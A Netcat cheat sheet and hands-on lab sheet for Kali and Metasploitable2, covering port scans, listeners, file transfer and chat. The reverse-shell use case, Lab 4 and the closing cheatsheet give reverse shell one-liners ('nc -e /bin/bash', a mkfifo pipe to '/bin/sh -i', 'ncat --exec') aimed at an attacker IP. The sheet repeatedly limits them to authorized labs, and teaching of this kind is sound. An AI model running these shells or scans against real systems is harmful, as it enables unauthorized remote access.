## üöÄ Common Use Cases

### 1. Connect to a Remote Port  
Test if a service is running.
```bash
nc <target_ip> <port>
```

### 2. Listen for Incoming Connections  
Set up a listener (e.g., for reverse shells or chat).
```bash
nc -lvp <port>
```

### 3. Port Scanning  
Scan for open ports.
```bash
nc -zv <target_ip> <start_port>-<end_port>
```

### 4. File Transfer

**Sender:**
```bash
nc -lvp 4444 < file.txt
```

**Receiver:**
```bash
nc <sender_ip> 4444 > file.txt
```

### 5. Simple Chat Between Two VMs

**On one VM:**
```bash
nc -lvp 1234
```

**On the other:**
```bash
nc <target_ip> 1234
```

### 6. Reverse Shell (Lab Use Only)
```bash
nc -e /bin/bash <attacker_ip> <port>
```
> ‚ö†Ô∏è Use only in ethical, controlled environments.

## üß† Flags to Remember

| Flag  | Description                                              |
|-------|----------------------------------------------------------|
| `-l`  | Listen mode                                              |

## ‚ö†Ô∏è Compatibility Notes

- Many modern distributions use **OpenBSD `nc`**, which often **does NOT** support `-e`.  
- `ncat` (from Nmap) may offer `--exec`/`--allow` and built-in SSL support.  
- Windows users may have `ncat` instead of standard GNU/OpenBSD `nc`.  
- Behavior and available flags vary by implementation ‚Äî check `man nc` or `nc -h` on your system.

---

## üìå Safety & Legal Reminder

- **Not encrypted** ‚Äî do **not** transmit sensitive data with plain `nc` over untrusted networks.  
- Use `nc` only on systems and networks you own or are explicitly authorized to test. Unauthorized access or attacks are illegal.  
- Prefer `ncat --ssl` or `openssl s_client` for encrypted sessions when appropriate.

---

## ‚úÖ Quick Example: Port Check + Verbose + Timeout
```bash
nc -zv -w 3 192.168.1.10 22-80
```

---

## ‚úÖ Quick Reference (one-liners)
```bash
# Check TCP service
nc target.example.com 80

# Start listener (TCP)
nc -lvp 4444

# UDP listen
nc -luv 5000

# Port scan
nc -zv 10.0.0.5 1-1024

# File transfer (sender)
nc -lvp 4444 < file.txt

# File transfer (receiver)
nc sender_ip 4444 > file.txt

# TLS using ncat (if available)
ncat --ssl example.com 443
```

# üß™ Netcat Practical Lab Sheet

This sheet walks through hands-on Netcat exercises using Kali Linux and Metasploitable2 on the same VirtualBox network.

---

# Netcat Labs (Kali & Metasploitable2)
> Use **only** in isolated lab environments you own or are authorized to test.  
> Never use these techniques against systems you do not have explicit permission to test.

---

## Overview
This document contains simple Netcat (`nc`) examples used in controlled labs to demonstrate basic connectivity, file transfer, and reverse shells. Replace the example IPs and filenames with values appropriate for your isolated lab setup.

---

## Flags & Quick Notes
- `-z`: Scan mode (no data sent)  
- `-v`: Verbose output  
- `-l`: Listen mode (server)  
- `-p`: Specify local port (listener)  
- `-N`: Shutdown network socket after EOF (useful to close cleanly)  
üîç **Output:** Shows which ports are open and responding.

---

## Pre-checks (Netcat version & networking)
Always verify the `nc` implementation and that lab networking allows the traffic.

```bash
# Common checks
nc -h            # show help (output varies by implementation)
nc --version     # works on some builds; if not, check package manager
which nc
# On Debian/Ubuntu you might have: netcat-openbsd or netcat-traditional
dpkg -l | grep netcat
```

Confirm VM networking (example for VirtualBox internal network):
- Ensure both VMs are on same host-only or internal network.
- Verify IPs with `ip a` or `ifconfig`.

---

## Lab 1: Port Scan (Basic)
**Purpose:** Quickly check for open ports on a target host.

```bash
# Example: scan ports 1-1000 on target
TARGET_IP="192.168.56.102"
nc -z -v $TARGET_IP 1-1000
```

üîç **Output:** Shows which ports are open and responding.


---

## Lab 2: Chat Between Kali and Metasploitable2
**Purpose:** Confirm basic TCP connectivity by exchanging plain text messages.

**On Metasploitable2 (listener/receiver):**
```bash
# Replace LISTEN_PORT and optionally use -p
nc -lvp 4444
```

**On Kali (client/sender):**
```bash
nc 192.168.56.102 4444
```

üîç **Result:** Type messages back and forth ‚Äî confirms connectivity.


---

## Lab 3: Transfer a File
**Purpose:** Send a file over TCP and verify integrity.

**On Receiver (Metasploitable2):**
```bash
nc -lvp 5555 > received.txt
```

**On Sender (Kali):**
```bash
nc 192.168.56.102 5555 < file.txt
```

**Verify integrity (on receiver):**
```bash
# On Sender before transfer
sha256sum file.txt

# On Receiver after transfer
sha256sum received.txt
# Compare the hashes ‚Äî they should match
```

üîç **Result:** `received.txt` should match `file.txt`.



---

## Lab 4: Reverse Shell (Ethical Use Only)
**Important:** Only run this in isolated, legal lab environments (e.g., intentionally vulnerable VMs you control). Reverse shells provide remote command access and are high-risk if used improperly.

**Simple Netcat reverse shell (if `-e` is supported):**

**On Kali (Listener):**
```bash
nc -lvp 4444
```

**On Metasploitable2 (Sender / target):**
```bash
nc 192.168.56.101 4444 -e /bin/bash
```

**If `-e` is NOT supported (common with netcat-openbsd), use a `mkfifo` workaround:**
```bash
# On the target (Metasploitable2)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f
```

**Alternative with ncat (Nmap's ncat) which supports `--exec`:**
```bash
# On target with ncat available:
ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
```

üîç **Result:** Kali gets shell access to Metasploitable2 (in lab only).

## Journal / Logging Template
Keep a short journal for each lab run to document what you did and why.

```
Date: 2025-10-14
Lab: Lab 1 / Lab 2 / Lab 3 / Lab 4
Target IP: 192.168.56.102
Listener IP: 192.168.56.103
Ports used: 4444, 5555, ...
Commands executed:
- nc -z -v 192.168.56.102 1-1000
- nc -lvp 4444
- nc 192.168.56.102 4444
Notes / Observations:
- Netcat version: netcat-openbsd 1.10
- -e unsupported; used mkfifo workaround
Hashes:
- SHA256(file.txt) = <paste-hash-here>
```

---

## Safety / Ethics
- Obtain **explicit permission** before interacting with any systems you do not own.  
- Use isolated lab environments (VirtualBox/VMware with internal networks, intentionally vulnerable VMs like Metasploitable).  
- Document actions and keep backups of any valuable data.  
- Some Netcat builds **do not** support `-e`; behavior varies. When in doubt, test `nc -h` or use `mkfifo` or `ncat`.

---

## Troubleshooting & Notes
- If `nc` reports `address already in use` ‚Äî check for other listeners on that port: `ss -ltnp | grep 4444`.  
- If file transfer appears corrupted, verify file sizes and `sha256sum`.  
- If listener doesn't receive anything, confirm firewall rules, VM network mode, and host-only adapter settings.  
- Use `tcpdump -i <iface> port 4444` or Wireshark to inspect traffic in the lab.  
- To close a listening `nc` session gracefully, try `Ctrl+C` on the listener or use `-N` on the client side where available.

---

## Quick Reference / Cheatsheet
```bash
# Port scan
nc -z -v TARGET 1-1000

# Start listener (verbose)
nc -lvp 4444

# Connect to listener
nc TARGET_IP 4444

# Send file (sender)
nc TARGET_IP 5555 < file.txt

# Receive file (listener)
nc -lvp 5555 > received.txt

# Reverse shell (if -e supported)
nc ATTACKER_IP 4444 -e /bin/bash

# Reverse shell workaround (mkfifo)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```
